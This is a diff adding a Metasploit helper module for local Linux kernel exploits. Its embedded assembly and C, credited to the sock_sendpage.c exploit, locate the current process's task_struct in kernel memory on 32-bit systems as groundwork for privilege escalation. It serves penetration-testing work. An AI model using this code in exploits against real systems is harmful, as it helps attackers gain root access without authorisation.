@@ -1,0 +1,63 @@
+# -*- coding: binary -*-
+
+module Msf
+module Exploit::Local::LinuxKernel
+  include Msf::Exploit::Local::CompileC
+
+  def current_task_struct_h(metasm_exe)
+    metasm_exe.parse <<-EOS
+      current_stack_pointer:
+        mov eax, esp
+        ret
+    EOS
+
+    # Taken from sock_sendpage.c
+    cparser.parse <<-EOC
+#define TASK_RUNNING 0
+
+int current_stack_pointer(void);
+
+static inline unsigned long
+current_task_struct(void)
+{
+  unsigned long task_struct, thread_info;
+
+  thread_info = current_stack_pointer() & ~(4096 - 1);
+
+  if (*(unsigned long *)thread_info >= 0xc0000000) {
+    task_struct = *(unsigned long *)thread_info;
+
+    /*
+     * The TASK_RUNNING is the only possible state for a process executing
+     * in user-space.
+     */
+    if (*(unsigned long *)task_struct == TASK_RUNNING)
+      return task_struct;
+  }
+
+  /*
+   * Prior to the 2.6 kernel series, the task_struct was stored at the end
+   * of the kernel stack.
+   */
+  task_struct = current_stack_pointer() & ~(8192 - 1);
+
+  if (*(unsigned long *)task_struct == TASK_RUNNING)
+    return task_struct;
+
+  thread_info = task_struct;
+
+  task_struct = *(unsigned long *)thread_info;
+
+  if (*(unsigned long *)task_struct == TASK_RUNNING)
+    return task_struct;
+
+  return -1;
+}
+
+EOC
+
+  end
+
+end
+end
+
